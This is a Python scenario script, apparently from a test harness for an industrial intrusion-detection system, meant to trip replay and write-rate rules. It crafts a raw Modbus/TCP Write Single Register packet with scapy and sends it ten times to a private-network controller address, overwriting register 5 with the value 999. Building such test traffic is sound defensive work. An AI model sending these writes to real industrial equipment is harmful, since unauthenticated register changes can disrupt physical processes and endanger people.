"""
Replay Attack Scenario

Crafts a raw Modbus/TCP FC06 (Write Single Register) packet and
retransmits the exact same payload multiple times in rapid succession.

Triggers rules:
- R-007: Replay Attack (Identical payload sent > 3 times in 5s)
- R-008: Excessive Write Rate
"""

import time
import logging
import struct
from scapy.all import IP, TCP, send

logger = logging.getLogger("injector")

def run():
    target_ip = "192.168.100.22"
    logger.info("Starting Replay Attack (T0856) against %s", target_ip)
    
    # Craft a synthetic Modbus FC06 packet
    # MBAP: TransID=1, Proto=0, Len=6, UnitID=1, FC=6
    # PDU:  Addr=5, Val=999
    mbap = struct.pack('>HHHBB', 1, 0, 6, 1, 6)
    pdu = struct.pack('>HH', 5, 999)
    payload = mbap + pdu
    
    # We use scapy to bypass pymodbus transaction ID auto-incrementing,
    # ensuring the payload is truly identical byte-for-byte.
    logger.info("  -> Replaying identical FC06 packet 10 times in 3 seconds...")
    
    for _ in range(10):
        pkt = IP(dst=target_ip) / TCP(dport=502, sport=44444, flags='PA') / payload
        send(pkt, verbose=0)
        time.sleep(0.3)
        
    logger.info("Replay Attack complete.")
